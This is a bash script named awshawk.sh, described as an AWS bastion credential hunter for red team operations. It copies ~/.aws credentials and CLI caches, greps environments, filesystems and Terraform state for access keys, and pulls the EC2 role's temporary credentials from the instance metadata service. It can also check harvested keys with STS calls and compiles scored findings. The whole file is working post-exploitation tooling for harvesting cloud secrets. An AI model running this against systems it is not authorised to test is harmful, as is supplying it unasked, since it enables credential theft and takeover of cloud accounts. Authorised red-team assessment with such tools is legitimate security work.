#!/usr/bin/env bash
#
# awshawk.sh
# AWS bastion credential hunter for red team operations
#
set -euo pipefail

print_banner() {
  cat <<'BANNER'
    ___        ______  _                    _    
   / \ \      / / ___|| |__   __ ___      _| | __
  / _ \ \ /\ / /\___ \| '_ \ / _` \ \ /\ / / |/ /
 / ___ \ V  V /  ___) | | | | (_| |\ V  V /|   < 
/_/   \_\_/\_/  |____/|_| |_|\__,_| \_/\_/ |_|\_\

by ChiZu
https://github.com/G0ldSec

BANNER
}

print_usage() {
  cat <<'USAGE'
Usage: ./awshawk.sh [flags]

Flags:
  -all          run all checks
  -env          capture AWS-related environment
  -awsdir       snapshot ~/.aws
  -patterns     wide content scan for AWS patterns
  -suspicious   suspicious filename heuristics
  -terraform    terraform state/tfvars scan
  -repos        run bundled gitleaks/trufflehog on repos
  -imds         EC2 IMDS role/creds check
  -sts          read-only STS identity checks (authorized only)
  -redact       produce an additional redacted summary
  -wide         crawl all readable dirs from /
  -nowide       force narrow mode
  -paths "a:b"  add extra search roots (colon-separated)
  -h|-help      show this help

Env:
  SCAN_WIDE=true|false      default: false
  MAX_DEPTH (default 8)     find -maxdepth used in scans
  MAX_SIZE_BYTES (default 5242880) max file size to inspect
  SCAN_BINARIES=true|false  default: false (skip binary files by magic)
USAGE
}

# Print banner first
print_banner

# -----------------------------
# Repo & helpers
# -----------------------------
REPO_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
HELPER_DIR="${REPO_DIR}/helper"
RESULTS_BASE="${REPO_DIR}/results"
TS="$(date +%Y%m%dT%H%M%S)"
OUTDIR="${RESULTS_BASE}/${TS}-aws-bastion"
mkdir -p "${OUTDIR}"
export PATH="${HELPER_DIR}:${PATH}"

# Default tuning
SCAN_WIDE="${SCAN_WIDE:-false}"
MAX_DEPTH="${MAX_DEPTH:-8}"
MAX_SIZE_BYTES="${MAX_SIZE_BYTES:-5242880}"   # 5 MiB
SCAN_BINARIES="${SCAN_BINARIES:-false}"

# Helper detection
HAS_TRUFFLEHOG=false; command -v trufflehog >/dev/null 2>&1 && HAS_TRUFFLEHOG=true || true
HAS_GITLEAKS=false;   command -v gitleaks   >/dev/null 2>&1 && HAS_GITLEAKS=true   || true
HAS_AWSCLI=false;     command -v aws        >/dev/null 2>&1 && HAS_AWSCLI=true     || true
HAS_JQ=false;         command -v jq         >/dev/null 2>&1 && HAS_JQ=true         || true

# -----------------------------
# Arg parsing
# -----------------------------
DO_ALL=false
DO_ENV=false
DO_AWSDIR=false
DO_PATTERNS=false
DO_SUSPICIOUS=false
DO_TERRAFORM=false
DO_REPOS=false
DO_IMDS=false
DO_STS=false
DO_REDACT=false
EXTRA_PATHS=""

while [ "$#" -gt 0 ]; do
  case "${1:-}" in
    -all) DO_ALL=true ;;
    -env) DO_ENV=true ;;
    -awsdir) DO_AWSDIR=true ;;
    -patterns) DO_PATTERNS=true ;;
    -suspicious) DO_SUSPICIOUS=true ;;
    -terraform) DO_TERRAFORM=true ;;
    -repos) DO_REPOS=true ;;
    -imds) DO_IMDS=true ;;
    -sts) DO_STS=true ;;
    -redact) DO_REDACT=true ;;
    -wide) SCAN_WIDE=true ;;
    -nowide) SCAN_WIDE=false ;;
    -paths) shift; EXTRA_PATHS="${1:-}";;
    -h|-help|--help) print_usage; exit 0 ;;
    *) echo "Unknown flag: $1"; print_usage; exit 1 ;;
  esac
  shift
done

if [ "$DO_ALL" = true ]; then
  DO_ENV=true; DO_AWSDIR=true; DO_PATTERNS=true; DO_SUSPICIOUS=true; DO_TERRAFORM=true; DO_REPOS=true; DO_IMDS=true
fi

# If no flags selected, print help
if ! $DO_ALL && ! $DO_ENV && ! $DO_AWSDIR && ! $DO_PATTERNS && ! $DO_SUSPICIOUS && ! $DO_TERRAFORM && ! $DO_REPOS && ! $DO_IMDS && ! $DO_STS; then
  print_usage; echo; echo "Tip: try './awshawk.sh -all -wide -redact'"; exit 0
fi

# -----------------------------
# Logging helpers
# -----------------------------
log() { printf '%s %s\n' "[$(date -u +'%Y-%m-%dT%H:%M:%SZ')]" "$*" | tee -a "${OUTDIR}/run.log" >&2; }
first_n() { head -n "${2:-100}" "$1" 2>/dev/null || true; }
copy_if_readable() { local s="$1" d="$2"; [ -e "$s" ] && [ -r "$s" ] && { mkdir -p "$(dirname "${OUTDIR}/$d")"; cp -a "$s" "${OUTDIR}/$d" 2>/dev/null || true; }; }

# -----------------------------
# Path set (wide vs narrow)
# -----------------------------
BASE_PATHS=("$HOME" "/home" "/srv" "/opt" "/var/www" "/usr/local" "/mnt")
declare -a CANDIDATE_PATHS
EXCLUDES_REGEX="^(/proc|/sys|/dev|/run|/boot|/snap|/lost\+found|/var/log/journal|/var/lib/docker|/var/lib/containers)"

if [ "$SCAN_WIDE" = true ]; then
  CANDIDATE_PATHS=("$HOME")
  while IFS= read -r d; do CANDIDATE_PATHS+=("$d"); done < <(find / -xdev -maxdepth 2 -type d -readable 2>/dev/null | egrep -v "${EXCLUDES_REGEX}" | sort -u)
else
  CANDIDATE_PATHS=("${BASE_PATHS[@]}")
fi

# Extra paths (colon-separated)
IFS=':' read -r -a EXTRA_ARR <<< "${EXTRA_PATHS:-}"
for p in "${EXTRA_ARR[@]}"; do [ -n "$p" ] && CANDIDATE_PATHS+=("$p"); done

# Deduplicate
mapfile -t CANDIDATE_PATHS < <(printf "%s\n" "${CANDIDATE_PATHS[@]}" | awk 'NF && !x[$0]++')
printf "%s\n" "${CANDIDATE_PATHS[@]}" > "${OUTDIR}/paths_considered.txt"

# -----------------------------
# Basic info
# -----------------------------
log "Start (wide=${SCAN_WIDE}, depth=${MAX_DEPTH}, max_size=${MAX_SIZE_BYTES}, scan_binaries=${SCAN_BINARIES})"
{
  echo "timestamp: $(date -u +'%Y-%m-%dT%H:%M:%SZ')"
  echo "whoami: $(whoami)"
  echo "id: $(id)"
  echo "hostname: $(hostname -f 2>/dev/null || hostname)"
  echo "kernel: $(uname -a)"
  echo "helpers: trufflehog=${HAS_TRUFFLEHOG} gitleaks=${HAS_GITLEAKS} awscli=${HAS_AWSCLI} jq=${HAS_JQ}"
} > "${OUTDIR}/basic_info.txt"

# -----------------------------
# 1) ENV
# -----------------------------
if [ "$DO_ENV" = true ]; then
  log "Collect env (AWS-related)"
  env | egrep -i '(^|[^A-Z_])AWS|ACCESS_KEY|SECRET_KEY|SESSION_TOKEN|AWS_PROFILE|AWS_REGION' > "${OUTDIR}/env_aws_vars.txt" 2>/dev/null || true
fi

# -----------------------------
# 2) ~/.aws
# -----------------------------
if [ "$DO_AWSDIR" = true ]; then
  log "Snapshot ~/.aws"
  if [ -d "$HOME/.aws" ] && [ -r "$HOME/.aws" ]; then
    mkdir -p "${OUTDIR}/aws_home"
    copy_if_readable "$HOME/.aws/credentials" "aws_home/credentials"
    copy_if_readable "$HOME/.aws/config"      "aws_home/config"
    copy_if_readable "$HOME/.aws/sso"         "aws_home/sso"
    copy_if_readable "$HOME/.aws/cli/cache"   "aws_home/cli_cache"
    copy_if_readable "$HOME/.aws/cli/history" "aws_home/cli_history"
    {
      echo "=== ~/.aws/credentials (first 150) ==="; first_n "$HOME/.aws/credentials" 150; echo
      echo "=== ~/.aws/config (first 150) ==="; first_n "$HOME/.aws/config" 150
    } > "${OUTDIR}/aws_home_preview.txt"
  else
    echo "~/.aws not present or not readable" > "${OUTDIR}/aws_home_preview.txt"
  fi
fi

# -----------------------------
# 3) Suspicious filenames
# -----------------------------
if [ "$DO_SUSPICIOUS" = true ]; then
  log "Suspicious filename heuristics"
  NAME_REGEX='(^|/)\.env(\.|$)|(^|/)\.aws($|/)|credentials(\.txt|\.ini|\.cfg)?$|aws.*(cred|key|secret)|secrets?(\.ya?ml|\.json|\.tfvars|\.env)?$|config(\.json|\.ya?ml)?$|terraform\.tfstate(\.backup)?$|serverless\.ya?ml$|application(-.*)?\.properties$|credentials\.csv$'
  : > "${OUTDIR}/suspicious_filenames.txt"
  for p in "${CANDIDATE_PATHS[@]}"; do
    [ -d "$p" ] || continue
    find "$p" -xdev -maxdepth "$MAX_DEPTH" -type f -readable 2>/dev/null \
      | egrep -i "${NAME_REGEX}" >> "${OUTDIR}/suspicious_filenames.txt" || true
  done
fi

# -----------------------------
# 4) Terraform state & tfvars scan
# -----------------------------
if [ "$DO_TERRAFORM" = true ]; then
  log "Terraform state / tfvars scan"
  TF_OUT_DIR="${OUTDIR}/terraform"
  mkdir -p "${TF_OUT_DIR}"

  : > "${TF_OUT_DIR}/tf_candidates.txt"
  for p in "${CANDIDATE_PATHS[@]}"; do
    [ -d "$p" ] || continue
    find "$p" -xdev -maxdepth "$MAX_DEPTH" -type f -readable 2>/dev/null \
      \( -name '*.tfstate' -o -name '*.tfstate.backup' -o -name '*.tfvars' -o -name 'terraform.tfvars*' \) \
      >> "${TF_OUT_DIR}/tf_candidates.txt"
  done

  while read -r f; do
    [ -n "$f" ] || continue
    base="$(echo "$f" | tr '/ ' '__')"
    # Copy small file for evidence
    if [ "$(stat -c%s "$f" 2>/dev/null || echo 0)" -le "$MAX_SIZE_BYTES" ]; then
      copy_if_readable "$f" "terraform/samples/${base}"
    fi
    if $HAS_JQ && file "$f" 2>/dev/null | grep -qi 'json'; then
      jq 'paths | map(tostring) | join(".")' "$f" > "${TF_OUT_DIR}/${base}.paths.txt" 2>/dev/null || true
      for key in access_key secret_key token akid aws_access_key_id aws_secret_access_key aws_session_token; do
        jq -r ".. | .\"$key\"? // empty" "$f" 2>/dev/null | sed 's/^/VAL: /' >> "${TF_OUT_DIR}/${base}.secrets.txt" || true
      done
      jq -r '.. | objects | select(has("type")) | .type' "$f" 2>/dev/null | sort -u > "${TF_OUT_DIR}/${base}.types.txt" || true
    else
      grep -nEi 'aws_access_key_id|aws_secret_access_key|session_token|access.?key|secret.?key|AKIA[0-9A-Z]{16}|ASIA[0-9A-Z]{16}' "$f" \
        > "${TF_OUT_DIR}/${base}.secrets.grep.txt" 2>/dev/null || true
      grep -nEi '"type"\s*:\s*"aws_[a-z_]+"' "$f" > "${TF_OUT_DIR}/${base}.types.grep.txt" 2>/dev/null || true
    fi
  done < "${TF_OUT_DIR}/tf_candidates.txt"
fi

# -----------------------------
# 5) Content pattern scan (AWS)
# -----------------------------
if [ "$DO_PATTERNS" = true ]; then
  log "Deep content scan for AWS patterns"
  AWS_PATTERNS='AKIA[0-9A-Z]{16}|ASIA[0-9A-Z]{16}|A3T[A-Z0-9]{13}|aws_access_key_id|aws_secret_access_key|AWS_ACCESS_KEY_ID|AWS_SECRET_ACCESS_KEY|aws_session_token|AWS_SESSION_TOKEN|aws_default_region|AWS_DEFAULT_REGION|sso_start_url|sso_region|sso_account_id|sso_role_name'
  PATTERN_OUT="${OUTDIR}/aws_pattern_hits.txt"
  : > "${PATTERN_OUT}"

  scan_file_content() {
    local f="$1"
    if [ "$SCAN_BINARIES" != "true" ]; then
      file "$f" 2>/dev/null | egrep -qi 'text|utf-8|ascii|json|ya?ml|xml|pem|ini|toml|conf|config|sh|bash|zsh|env|properties|csv' || return 0
    fi
    if grep -IEnH --binary-files=without-match -m 1 -E "${AWS_PATTERNS}" "$f" >/dev/null 2>&1; then
      {
        echo "----- FILE: $f -----"
        grep -IEnH --binary-files=without-match -n -m 12 -E "${AWS_PATTERNS}" "$f"
        echo
      } >> "${PATTERN_OUT}"
    fi
  }

  for p in "${CANDIDATE_PATHS[@]}"; do
    [ -d "$p" ] || continue
    find "$p" -xdev -maxdepth "$MAX_DEPTH" -type f -readable -size -"${MAX_SIZE_BYTES}"c 2>/dev/null \
      | while read -r f; do scan_file_content "$f"; done
  done
fi

# -----------------------------
# 6) IMDS
# -----------------------------
if [ "$DO_IMDS" = true ]; then
  log "IMDS query"
  IMDS_OUT="${OUTDIR}/imds.txt"
  set +e
  TOKEN="$(curl -sS -X PUT 'http://169.254.169.254/latest/api/token' -H 'X-aws-ec2-metadata-token-ttl-seconds:21600' -m 5 2>/dev/null)"
  if [ -n "${TOKEN}" ]; then
    {
      echo "IMDSv2 token obtained"
      ROLE="$(curl -sS -H "X-aws-ec2-metadata-token: ${TOKEN}" 'http://169.254.169.254/latest/meta-data/iam/security-credentials/' -m 5 2>/dev/null)"
      echo "Role: ${ROLE:-<none>}"
      if [ -n "$ROLE" ]; then
        CREDS_JSON="$(curl -sS -H "X-aws-ec2-metadata-token: ${TOKEN}" "http://169.254.169.254/latest/meta-data/iam/security-credentials/${ROLE}" -m 5 2>/dev/null)"
        echo "Credentials JSON (first 2000 chars):"; echo "${CREDS_JSON}" | cut -c1-2000
        echo "${CREDS_JSON}" > "${OUTDIR}/imds_creds.json"
        $HAS_JQ && jq . "${OUTDIR}/imds_creds.json" > "${OUTDIR}/imds_creds.pretty.json" 2>/dev/null || true
      fi
    } > "${IMDS_OUT}"
  else
    { echo "IMDSv2 token not obtained; trying IMDSv1..."; curl -sS 'http://169.254.169.254/latest/meta-data/iam/security-credentials/' -m 3 || echo "IMDSv1 unreachable"; } > "${IMDS_OUT}"
  fi
  set -e
fi

# -----------------------------
# 7) Repos (gitleaks / trufflehog)
# -----------------------------
if [ "$DO_REPOS" = true ]; then
  log "Repo discovery + bundled scanners"
  REPO_TARGETS="${OUTDIR}/scan_targets.txt"
  : > "${REPO_TARGETS}"

  declare -a REPO_DIRS
  for p in "${CANDIDATE_PATHS[@]}"; do
    [ -d "$p" ] || continue
    while IFS= read -r gd; do
      d="$(dirname "$gd")"; [ -r "$d" ] && REPO_DIRS+=("$d")
    done < <(find "$p" -xdev -maxdepth 3 -type d -name ".git" -readable 2>/dev/null)
  done
  [ "${#REPO_DIRS[@]}" -eq 0 ] && REPO_DIRS=("$HOME")
  mapfile -t REPO_DIRS < <(printf "%s\n" "${REPO_DIRS[@]}" | awk 'NF && !x[$0]++')
  printf "%s\n" "${REPO_DIRS[@]}" > "${REPO_TARGETS}"

  if [ "$HAS_GITLEAKS" = true ]; then
    log "Running gitleaks on ${#REPO_DIRS[@]} target(s)"
    for d in "${REPO_DIRS[@]}"; do
      outj="${OUTDIR}/gitleaks-$(echo "$d" | tr '/ ' '__').json"
      gitleaks detect --source="$d" --report-path="$outj" 2>>"${OUTDIR}/gitleaks.err" || true
    done
  else
    log "gitleaks not bundled — skipping"
  fi

  if [ "$HAS_TRUFFLEHOG" = true ]; then
    log "Running trufflehog filesystem on repo roots"
    for d in "${REPO_DIRS[@]}"; do
      outj="${OUTDIR}/trufflehog-$(echo "$d" | tr '/ ' '__').json"
      trufflehog filesystem "$d" --json > "$outj" 2>>"${OUTDIR}/trufflehog.err" || true
    done
  else
    log "trufflehog not bundled — skipping"
  fi
fi

# -----------------------------
# 8) Optional STS validation (authorized only)
# -----------------------------
if [ "$DO_STS" = true ] && [ "$HAS_AWSCLI" = true ]; then
  log "STS read-only identity checks (authorized only)"
  # env creds
  if env | egrep -qi 'AWS_ACCESS_KEY_ID|AWS_SECRET_ACCESS_KEY|AWS_SESSION_TOKEN'; then
    aws sts get-caller-identity --output json > "${OUTDIR}/sts_env.json" 2>"${OUTDIR}/sts_env.err" || true
  fi
  # profiles
  if [ -f "$HOME/.aws/credentials" ]; then
    awk -F '[][]' '/\[/{print $2}' "$HOME/.aws/credentials" | while read -r prof; do
      [ -n "$prof" ] || continue
      AWS_PROFILE="$prof" aws sts get-caller-identity --output json > "${OUTDIR}/sts_profile_${prof}.json" 2>"${OUTDIR}/sts_profile_${prof}.err" || true
    done
  fi
  # imds temp creds if captured
  if [ -f "${OUTDIR}/imds_creds.json" ]; then
    AKID="$(grep -Eo '"AccessKeyId"\s*:\s*"[^"]+"' "${OUTDIR}/imds_creds.json" | head -n1 | cut -d'"' -f4 || true)"
    SKEY="$(grep -Eo '"SecretAccessKey"\s*:\s*"[^"]+"' "${OUTDIR}/imds_creds.json" | head -n1 | cut -d'"' -f4 || true)"
    STOK="$(grep -Eo '"Token"\s*:\s*"[^"]+"' "${OUTDIR}/imds_creds.json" | head -n1 | cut -d'"' -f4 || true)"
    if [ -n "$AKID" ] && [ -n "$SKEY" ] && [ -n "$STOK" ]; then
      AWS_ACCESS_KEY_ID="$AKID" AWS_SECRET_ACCESS_KEY="$SKEY" AWS_SESSION_TOKEN="$STOK" \
        aws sts get-caller-identity --output json > "${OUTDIR}/sts_imds.json" 2>"${OUTDIR}/sts_imds.err" || true
    fi
  fi
fi

# -----------------------------
# 9) Unified hits index + severity scoring
# -----------------------------
log "Build unified hits index and severity scoring"
INDEX="${OUTDIR}/hits_index.csv"
SCORED="${OUTDIR}/hits_scored.csv"
MD="${OUTDIR}/FINDINGS.md"
echo "source,type,file,line,detail" > "$INDEX"

# Pattern hits
if [ -f "${OUTDIR}/aws_pattern_hits.txt" ]; then
  awk '
    /^----- FILE: /{gsub(/^----- FILE: /,""); gsub(/ -----$/,""); file=$0; next}
    /^[0-9]+:/{
      split($0, a, ":"); line=a[1]; detail=substr($0, index($0, a[2]))
      gsub(/"/,"\"\"", detail)
      printf "patterns,content,\"%s\",%s,\"%s\"\n", file, line, detail
    }
  ' "${OUTDIR}/aws_pattern_hits.txt" >> "$INDEX"
fi

# Suspicious filenames
if [ -f "${OUTDIR}/suspicious_filenames.txt" ]; then
  awk '{gsub(/"/,"\"\""); printf "suspicious,filename,\"%s\",,\n", $0}' \
    "${OUTDIR}/suspicious_filenames.txt" >> "$INDEX"
fi

# Terraform artifacts
if [ -d "${OUTDIR}/terraform" ]; then
  find "${OUTDIR}/terraform" -type f -name '*.secrets.grep.txt' -readable 2>/dev/null | while read -r f; do
    src=$(basename "$f" | sed 's/\.secrets\.grep\.txt$//')
    while IFS= read -r line; do
      [ -n "$line" ] || continue
      ln_no=$(echo "$line" | awk -F: '{print $1}')
      detail=$(echo "$line" | cut -d: -f2- | sed 's/"/""/g')
      printf "terraform,content,\"%s\",%s,\"%s\"\n" "$src" "${ln_no:-}" "$detail" >> "$INDEX"
    done < "$f"
  done
  find "${OUTDIR}/terraform" -type f -name '*.secrets.txt' -readable 2>/dev/null | while read -r f; do
    src=$(basename "$f" | sed 's/\.secrets\.txt$//')
    while IFS= read -r val; do
      [ -n "$val" ] || continue
      detail=$(echo "$val" | sed 's/^VAL: //; s/"/""/g')
      printf "terraform,json,\"%s\",,\"%s\"\n" "$src" "$detail" >> "$INDEX"
    done < "$f"
  done
fi

# gitleaks JSON
if command -v jq >/dev/null 2>&1; then
  for j in "${OUTDIR}"/gitleaks-*.json; do
    [ -f "$j" ] || continue
    jq -r '
      .[]? | [
        "gitleaks",
        ( .RuleID // "rule" ),
        ( .File // "" ),
        ( .StartLine // .Line // null ),
        ( .Description // .Match // .Secret // "" )
      ] | @csv
    ' "$j" 2>/dev/null >> "$INDEX" || true
  done
fi

# trufflehog JSON (line-delimited)
if command -v jq >/dev/null 2>&1; then
  for j in "${OUTDIR}"/trufflehog-*.json; do
    [ -f "$j" ] || continue
    while IFS= read -r line; do
      echo "$line" | jq -r '
        [
          "trufflehog",
          ( .Rule // "rule" ),
          ( .SourceMetadata.Data.Filesystem.file // .SourceMetadata.Data.Git.file // "" ),
          ( .SourceMetadata.Data.Git.line // null ),
          ( .Redacted // .Raw // .Match // "" )
        ] | @csv
      ' 2>/dev/null >> "$INDEX" || true
    done < "$j"
  done
fi

# Severity rules
AKIA_RE='AKIA[0-9A-Z]{16}|ASIA[0-9A-Z]{16}'
SKEY_RE='AWS_SECRET_ACCESS_KEY|aws_secret_access_key|SecretAccessKey'
TOK_RE='AWS_SESSION_TOKEN|aws_session_token|"Token"'
SSO_RE='sso_start_url|sso_region|sso_account_id|sso_role_name'
BENIGN_RE='AWS_DEFAULT_REGION|aws_default_region|AWS_REGION'

FILES_WITH_AKIA=$(awk -F, -v re="$AKIA_RE" 'BEGIN{IGNORECASE=1} NR>1{if($5 ~ re){gsub(/^"|"$/,"",$3);print $3}}' "$INDEX" | sort -u)
FILES_WITH_SKEY=$(awk -F, -v re="$SKEY_RE" 'BEGIN{IGNORECASE=1} NR>1{if($5 ~ re){gsub(/^"|"$/,"",$3);print $3}}' "$INDEX" | sort -u)
echo "$FILES_WITH_AKIA" > "${OUTDIR}/.files_akia"
echo "$FILES_WITH_SKEY" > "${OUTDIR}/.files_skey"

PAIR_CHECK() { local f="$1"; grep -Fxq "$f" "${OUTDIR}/.files_akia" 2>/dev/null && grep -Fxq "$f" "${OUTDIR}/.files_skey" 2>/dev/null; }

IMDSV1_OPEN="false"
if [ -f "${OUTDIR}/imds.txt" ]; then
  grep -q "IMDSv2 token obtained" "${OUTDIR}/imds.txt" || IMDSV1_OPEN="true"
fi

echo "severity,source,type,file,line,detail" > "$SCORED"
tail -n +2 "$INDEX" | while IFS= read -r row; do
  src=$(echo "$row" | awk -F, '{print $1}')
  typ=$(echo "$row" | awk -F, '{print $2}')
  file=$(echo "$row" | awk -F, '{print $3}')
  line=$(echo "$row" | awk -F, '{print $4}')
  detail=$(echo "$row" | cut -d, -f5-)

  file=${file#\"}; file=${file%\"}
  detail=${detail#\"}; detail=${detail%\"}

  sev="low"

  if PAIR_CHECK "$file"; then
    sev="critical"
  else
    echo "$detail" | egrep -qi "$SKEY_RE" && sev="high"
    if echo "$detail" | egrep -qi "$AKIA_RE"; then
      echo "$file" | egrep -qi '\.env|\.tfvars|\.tfstate|credentials|\.ya?ml|\.json|\.properties|/var/www|/opt|/srv' && sev="high"
      [ "$sev" = "low" ] && sev="medium"
    fi
    echo "$detail" | egrep -qi "$TOK_RE|$SSO_RE" && [ "$sev" = "low" ] && sev="medium"
    echo "$detail" | egrep -qi "$BENIGN_RE" && [ "$sev" = "low" ] && sev="low"
  fi

  if [ "$src" = "terraform" ]; then
    echo "$detail" | egrep -qi "$SKEY_RE|$AKIA_RE" && { [ "$sev" = "medium" -o "$sev" = "low" ] && sev="high"; }
  fi

  printf "%s,%s,%s,\"%s\",%s,\"%s\"\n" "$sev" "$src" "$typ" "$file" "$line" "$detail" >> "$SCORED"
done

if [ "$IMDSV1_OPEN" = "true" ]; then
  echo 'high,imds,config,"<instance-metadata>",, "IMDSv1 reachable or IMDSv2 token not obtained; evaluate IMDS hardening and hop protections"' >> "$SCORED"
fi

{
  echo "# AWS Findings (non-root) — $(date -u +'%Y-%m-%dT%H:%M:%SZ')"
  for sev in critical high medium low; do
    echo; echo "## $(echo $sev | tr a-z A-Z)"
    awk -F, -v s="$sev" 'NR>1{if($1==s){printf "- **%s** %s:%s — %s\n", $2, $4, ($5==""?"?":$5), $6}}' "$SCORED"
  done
} > "$MD"

RED=$(tput setaf 1 2>/dev/null || echo ""); YEL=$(tput setaf 3 2>/dev/null || echo "")
BLU=$(tput setaf 4 2>/dev/null || echo ""); GRN=$(tput setaf 2 2>/dev/null || echo "")
RST=$(tput sgr0 2>/dev/null || echo "")
C=$(awk -F, 'NR>1&&$1=="critical"{c++}END{print c+0}' "$SCORED")
H=$(awk -F, 'NR>1&&$1=="high"{c++}END{print c+0}' "$SCORED")
M=$(awk -F, 'NR>1&&$1=="medium"{c++}END{print c+0}' "$SCORED")
L=$(awk -F, 'NR>1&&$1=="low"{c++}END{print c+0}' "$SCORED")

echo
echo "${RED}Critical:${RST} $C  ${YEL}High:${RST} $H  ${BLU}Medium:${RST} $M  ${GRN}Low:${RST} $L"
echo "Files:"
echo "  - Unified index: ${INDEX}"
echo "  - Scored CSV:    ${SCORED}"
echo "  - Markdown:      ${MD}"

# -----------------------------
# 10) Summary (+ optional redacted)
# -----------------------------
log "Write summary"
{
  echo "AWS Bastion Non-Root — Summary"
  echo "==============================="
  echo "When: $(date -u +'%Y-%m-%dT%H:%M:%SZ')"
  echo "Host: $(hostname -f 2>/dev/null || hostname)"
  echo "Wide=${SCAN_WIDE} Depth=${MAX_DEPTH} MaxSize=${MAX_SIZE_BYTES} ScanBinaries=${SCAN_BINARIES}"
  echo "Helpers: trufflehog=${HAS_TRUFFLEHOG} gitleaks=${HAS_GITLEAKS} awscli=${HAS_AWSCLI} jq=${HAS_JQ}"
  echo
  [ -f "${OUTDIR}/env_aws_vars.txt" ] && { echo "Env AWS vars (first 50):"; first_n "${OUTDIR}/env_aws_vars.txt" 50; echo; }
  [ -f "${OUTDIR}/suspicious_filenames.txt" ] && { echo "Suspicious filenames (first 200):"; first_n "${OUTDIR}/suspicious_filenames.txt" 200; echo; }
  [ -f "${OUTDIR}/aws_pattern_hits.txt" ] && { echo "Pattern hits (first 250):"; first_n "${OUTDIR}/aws_pattern_hits.txt" 250; echo; }
  [ -f "${OUTDIR}/terraform/tf_candidates.txt" ] && { echo "Terraform candidates:"; first_n "${OUTDIR}/terraform/tf_candidates.txt" 200; echo; }
  [ -f "${OUTDIR}/imds.txt" ] && { echo "IMDS (first 60):"; first_n "${OUTDIR}/imds.txt" 60; echo; }
  [ -f "${OUTDIR}/scan_targets.txt" ] && { echo "Repo scan targets:"; first_n "${OUTDIR}/scan_targets.txt" 200; echo; }
} > "${OUTDIR}/summary.txt"

if [ "$DO_REDACT" = true ]; then
  log "Produce redacted summary (masking secrets)"
  sed -E \
    -e 's/(AKIA[0-9A-Z]{8})[0-9A-Z]{8}/\1********/g' \
    -e 's/(ASIA[0-9A-Z]{8})[0-9A-Z]{8}/\1********/g' \
    -e 's/("AccessKeyId"\s*:\s*")[^"]+/\1AKIA************/g' \
    -e 's/("SecretAccessKey"\s*:\s*")[^"]+/\1********************/g' \
    -e 's/("Token"\s*:\s*")[^"]+/\1**REDACTED**/g' \
    -e 's/(aws_secret_access_key\s*=\s*)[A-Za-z0-9+\/=]{20,}/\1********************/g' \
    -e 's/(AWS_SECRET_ACCESS_KEY=)[^[:space:]]+/\1********************/g' \
    -e 's/(AWS_SESSION_TOKEN=)[^[:space:]]+/\1**REDACTED**/g' \
    "${OUTDIR}/summary.txt" > "${OUTDIR}/summary.redacted.txt" || true
fi

log "Done. Results: ${OUTDIR}"
echo "Tips:"
echo " - Keep raw evidence confidential; share 'FINDINGS.md' or 'summary.redacted.txt' if needed."
echo " - To scan EVERYTHING readable: add -wide and tune MAX_DEPTH/MAX_SIZE_BYTES."
echo " - For authorized identity checks: add -sts (requires ./helper/aws)."
exit 0
